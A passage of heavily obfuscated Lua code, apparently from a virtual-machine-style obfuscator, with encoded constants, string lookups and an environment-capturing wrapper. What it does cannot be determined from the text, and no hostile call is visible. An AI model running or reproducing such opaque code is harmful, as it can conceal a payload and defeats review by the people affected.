a=R(-745496-(-716040))G=R(-409172+379881)a=C[a]y=b[P]a=a(C,y)b=B[v[337168-337166]]C=R(-139331+109875)S=B[v[129681-129678]]P=S(G,p)y=b[P]p=509953+28850478296185 C=a[C]C=C(a,y)b=B[v[879916+-879914]]d=19047889558370-(-198467)S=B[v[-940248-(-940251)]]G=R(-50170+20941)a=R(30773+-60229)P=S(G,p)G=-714270+20342297742110 y=b[P]a=C[a]a=a(C,y)P=R(-25261-4214)p=225017+10117189591918 y=B[v[483363+-483361]]b=B[v[384825-384822]]S=b(P,G)C=y[S]F=a[C]B[v[715637-715633]]=F C=R(564336-593610)G=R(933775+-963210)a=z[C]b=B[v[-582209-(-582211)]]C=R(-425141-(-395655))C=a[C]S=B[v[911169+-911166]]P=S(G,p)y=b[P]G=R(-453485-(-424116))C=C(a,y)b=B[v[-773748-(-773750)]]a=R(569016+-598472)S=B[v[632097-632094]]p=13680094357998-413964 a=C[a]P=S(G,p)y=b[P]p=-651870+17384523403773 a=a(C,y)b=B[v[-609505+609507]]C=R(-878596-(-849140))S=B[v[418479+-418476]]G=R(493740-523156)P=S(G,p)C=a[C]y=b[P]C=C(a,y)G=R(-304960-(-275710))p=23186831145945-889260 a=R(-330542+301086)b=B[v[-283074-(-283076)]]S=B[v[-274176-(-274179)]]P=S(G,p)y=b[P]G=R(197332+-226814)a=C[a]a=a(C,y)p=-471560+9982902961200 b=B[v[325446-325444]]S=B[v[752151-752148]]P=S(G,p)p=-90588+31514868308783 G=R(-1073684-(-1044355))y=b[P]C=R(355347-384803)C=a[C]C=C(a,y)b=B[v[330741-330739]]S=B[v[95699-95696]]P=S(G,p)y=b[P]p=4314859676771-(-287606)a=R(-27697+-1759)a=C[a]a=a(C,y)b=B[v[-111063+111065]]S=B[v[-129089-(-129092)]]G=R(397859+-427144)P=S(G,p)C=R(78615-108071)y=b[P]C=a[C]p=917262+33415699447226 C=C(a,y)G=R(-1029921+1000637)b=B[v[589081-589079]]S=B[v[-728249-(-728252)]]P=S(G,p)a=R(-77705+48249)y=b[P]a=C[a]G=R(933320-962704)p=8451889965060-39077 a=a(C,y)b=B[v[-536308-(-536310)]]S=B[v[-681492-(-681495)]]P=S(G,p)C=R(-4483+-24973)p=33004463448262-(-858946)C=a[C]G=R(536560+-565924)y=b[P]C=C(a,y)b=B[v[-11969+11971]]a=R(870305+-899761)S=B[v[542149-542146]]a=C[a]P=S(G,p)G=R(1026276+-1055650)p=-738218+25249763471767 y=b[P]a=a(C,y)b=B[v[708227-708225]]S=B[v[821934-821931]]P=S(G,p)y=b[P]C=R(-283071-(-253615))C=a[C]C=C(a,y)p=1021974+26261010683822 a=R(-326950+297494)a=C[a]b=B[v[-326222-(-326224)]]G=R(-956368+927119)S=B[v[-190965-(-190968)]]P=S(G,p)p=26364320411887-(-278277)y=b[P]G=R(107882-137078)a=a(C,y)b=B[v[92049-92047]]C=R(396690+-426146)S=B[v[451984-451981]]P=S(G,p)y=b[P]C=a[C]C=C(a,y)p=-1035606+4091388662983 b=B[v[-406809-(-406811)]]S=B[v[344877-344874]]G=R(126226+-155628)a=R(-1035847+1006391)P=S(G,p)y=b[P]a=C[a]G=R(144858+-174117)a=a(C,y)b=B[v[-660886+660888]]p=8808404173900-(-740281)S=B[v[379170-379167]]C=R(454683+-484139)P=S(G,p)C=a[C]y=b[P]p=19667577822246-391264 C=C(a,y)b=B[v[-1010926+1010928]]G=R(-879510+850147)S=B[v[-928714+928717]]a=R(-236225+206769)a=C[a]P=S(G,p)y=b[P]P=R(801949-831332)G=13155670664191-(-521199)a=a(C,y)E=R(-734530+705068)y=B[v[-1022715+1022717]]b=B[v[-718292+718295]]S=b(P,G)G=R(320875-350091)b=F C=y[S]P=z[G]T=B[v[397255+-397254]]I=B[v[-1001526+1001528]]i=B[v[893961+-893958]]t=i(E,d)o=I[t]u=T[o]o=B[v[-879702-(-879704)]]t=R(145255-174494)E=295729+5745265461058 I=B[v[-272328+272331]]i=I(t,E)t=16813223285352-930771 T=o[i]q=u[T]i=R(-975878+946586)T=B[v[936561-936559]]o=B[v[299972+-299969]]I=o(i,t)i=64516+34696010810136 u=T[I]I=R(758627+-787892)n=q[u]u=B[v[745387+-745385]]T=B[v[-563-(-566)]]o=T(I,i)T=31249323293019-589956 q=u[o]p=n[q]G=P(p)u=R(214401-243779)p=B[v[-428466+428468]]n=B[v[801897+-801894]]q=n(u,T)P=p[q]S=G~=P F=S and 14560675-707977 or 1538992-(-1027402)y=S else F=true F=F and-312908+16920712 or-734453+1015709 end else b=-652206+652238 y=B[v[-56233-(-56236)]]C=y%b q=699104+-699102 S=B[v[-777016-(-777020)]]p=B[v[-399444+399446]]T=634888+-634875 i=B[v[-792378-(-792381)]]I=i-C i=-621070+621102 o=I/i u=T-o n=q^u G=p/n q=732020+-731764 P=S(G)n=416221+-416220 S=4294647273-(-320023)b=P%S P=-354442+354444 S=P^C y=b/S S=B[v[164112+-164108]]p=y%n n=4295904985-937689 G=p*n P=S(G)S=B[v[373030-373026]]G=S(y)b=P+G p=436476+-370940 P=850921-785385 S=b%P T=345150-344894 G=b-S P=G/p b=nil p=-834958+835214 y=nil C=nil G=S%p n=S-G S=nil p=n/q q=358925-358669 n=P%q u=P-n q=u/T F=2322657-(-132693)u={G;p,n,q}q=nil P=nil G=nil n=nil B[v[918940-918939]]=u p=nil end end else if F<15259178-(-938545)then if F<16091258-(-9050)then if F<171707+15894608 then B[v[129443-129438]]=a C=nil F=257926+12706535 else p=R(-734225-(-704724))G=a n=R(-457015-(-427624))o=R(-970549+941158)a=z[p]p=R(805966-835449)F=a[p]p=D()B[p]=F a=z[n]n=R(-86493-(-56988))F=a[n]u=F T=z[o]q=T n=F F=T and 13834947-576515 or 15436618-469702 end else q=33691837091089-(-192567)b=a(S)b=B[v[-699236-(-699239)]]n=R(-59674-(-30203))F=P P=B[v[263724+-263723]]G=B[v[358400-358398]]F=2071329-657930 p=G(n,q)S=P[p]a=b[S]S=M(-1009681+15762048,{v[-799814+799821],v[-269208+269212],y;v[884057+-884056];v[750498+-750496]})b=R(-937870+908485)b=a[b]y=k(y)b=b(a,S)end else if F<16805007-218149 then if F<17038804-716968 then B[y]=J U=B[m]r=299615-299614 l=U+r c=W[l]w=T+c c=475988+-475732 F=w%c T=F F=9107248-(-357)l=B[Y]c=o+l l=-960844+961100 w=c%l o=w else F=true F=F and-1000123+10151051 or 1717507-857686 end else F=-732488+3780744 end end end end end end end F=#X return h(a)end,function(z,R)local h=b(R)local Q=function(Q,v,X)return F(z,{Q,v,X},R,h)end return Q end,{},{},function(z,R)local h=b(R)local Q=function(Q,v,X,L,a,B)return F(z,{Q;v;X;L,a,B},R,h)end return Q end,361810-361810,function(z,R)local h=b(R)local Q=function(Q,v,X,L,a)return F(z,{Q;v;X;L,a},R,h)end return Q end return(P(-434561+14883302,{}))(h(a))end)(getfenv and getfenv()or _ENV,unpack or table[R(385657-414983)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
